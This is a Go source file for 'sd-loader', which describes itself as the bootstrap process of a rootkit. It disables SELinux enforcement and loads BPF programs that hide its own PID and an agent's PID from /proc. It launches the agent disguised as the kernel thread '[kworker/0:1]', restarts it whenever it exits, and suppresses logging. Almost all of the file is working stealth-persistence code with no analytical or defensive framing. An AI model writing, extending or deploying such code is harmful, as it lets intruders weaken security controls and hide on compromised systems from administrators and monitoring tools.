// Command sd-loader is the Plan-C rootkit bootstrap process. It runs as
// root via systemd and is responsible for:
//
//  1. disabling selinux enforcing (CAP_MAC_ADMIN, no-op if absent)
//  2. bumping RLIMIT_MEMLOCK so BPF programs can be loaded
//  3. loading the BPF collection (cgrp_sched programs + cgrp_pids map)
//  4. hiding its own pid from /proc (AddPid(os.Getpid()))
//  5. fork+exec'ing the agent binary (cmd/agent) with argv0 = "[kworker/0:1]"
//  6. hiding the agent pid too (AddPid(childPid))
//  7. blocking on signals; on SIGCHLD respawn, on SIGTERM/SIGINT clean exit
//
// The agent binary path defaults to /usr/libexec/kdhelper but can be
// overridden via SD_AGENT_BIN env var for testing.
package main

import (
	"context"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"os/signal"
	"syscall"
	"time"

	"sasakbpf/internal/bpf"
)

const (
	defaultAgentBin  = "/usr/libexec/kdhelper"
	agentWaitBootMs  = 300 // give child time to fork/connect before we block
)

// All informational output is suppressed in normal operation.
// Set SD_DEBUG=1 to re-enable logging for troubleshooting.
func debugf(format string, args ...interface{}) {
	if os.Getenv("SD_DEBUG") == "1" {
		fmt.Fprintf(os.Stderr, format, args...)
	}
}

func main() {
	if err := run(); err != nil {
		fmt.Fprintf(os.Stderr, "fatal: %v\n", err)
		os.Exit(1)
	}
}

func run() error {
	if err := setenforce("0"); err != nil {
		debugf("setenforce: %v (continuing)\n", err)
	}

	// 2. bump memlock for BPF
	if err := bpf.BumpMemlock(); err != nil {
		return fmt.Errorf("bump memlock: %w", err)
	}

	// 3. load BPF collection (fentry/fexit + maps)
	coll, err := bpf.Load()
	if err != nil {
		return fmt.Errorf("bpf load: %w", err)
	}
	defer coll.Close()
	debugf("bpf loaded\n")

	// 4. hide ourselves
	loaderPid := os.Getpid()
	if err := coll.AddPid(loaderPid); err != nil {
		return fmt.Errorf("add loader pid %d: %w", loaderPid, err)
	}
	debugf("self hidden pid=%d\n", loaderPid)

	// 5. signal handling
	ctx, stop := signal.NotifyContext(context.Background(),
		os.Interrupt, syscall.SIGTERM, syscall.SIGCHLD)
	defer stop()

	// 6. spawn agent, then block; restart if child exits
	agentBin := os.Getenv("SD_AGENT_BIN")
	if agentBin == "" {
		agentBin = defaultAgentBin
	}
	for {
		childPid, err := spawnAgent(agentBin)
		if err != nil {
			debugf("spawn: %v\n", err)
			select {
			case <-ctx.Done():
				return nil
			case <-time.After(3 * time.Second):
				continue
			}
		}
		if err := coll.AddPid(childPid); err != nil {
			debugf("add agent pid %d: %v\n", childPid, err)
		} else {
			debugf("agent hidden pid=%d\n", childPid)
		}

		// Block until signal or child death detected.
		if err := waitChild(ctx, childPid); err != nil {
			debugf("wait: %v\n", err)
		}
		if ctx.Err() != nil {
			return nil
		}
		debugf("agent=%d died — restarting in 2s\n", childPid)
		select {
		case <-ctx.Done():
			return nil
		case <-time.After(2 * time.Second):
		}
	}
}

// spawnAgent forks the agent binary with argv0 set to "[kworker/0:1]" so
// ps/top display it as a kernel worker. Returns the child PID.
func spawnAgent(bin string) (int, error) {
	if _, err := os.Stat(bin); err != nil {
		return 0, fmt.Errorf("stat %s: %w", bin, err)
	}
	cmd := exec.Command(bin)
	cmd.Args = []string{"[kworker/0:1]"} // disguise argv[0]
	// Inherit stdio so the agent's stderr can be captured via journald.
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = nil
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setsid: true, // detach from controlling terminal
	}
	if err := cmd.Start(); err != nil {
		return 0, fmt.Errorf("exec %s: %w", bin, err)
	}
	time.Sleep(agentWaitBootMs * time.Millisecond)
	return cmd.Process.Pid, nil
}

// waitChild blocks until ctx is cancelled or the child with pid dies.
// We poll /proc/<pid> every 2s (cheap) since we don't want SIGCHLD to
// race with our select (signals can coalesce).
func waitChild(ctx context.Context, pid int) error {
	t := time.NewTicker(2 * time.Second)
	defer t.Stop()
	for {
		select {
		case <-ctx.Done():
			return nil
		case <-t.C:
		}
		if !processAlive(pid) {
			return nil
		}
	}
}

// processAlive reports whether pid is reachable via kill(pid, 0).
func processAlive(pid int) bool {
	proc, err := os.FindProcess(pid)
	if err != nil {
		return false
	}
	if err := proc.Signal(syscall.Signal(0)); err == nil {
		return true
	} else if errors.Is(err, syscall.EPERM) {
		return true // exists but not ours
	}
	return false
}

// setenforce writes 0 to /sys/fs/selinux/enforce (selinux in develop mode).
// No-op on systems without selinux or when the write fails.
func setenforce(val string) error {
	f, err := os.OpenFile("/sys/fs/selinux/enforce", os.O_WRONLY, 0)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = f.WriteString(val)
	return err
}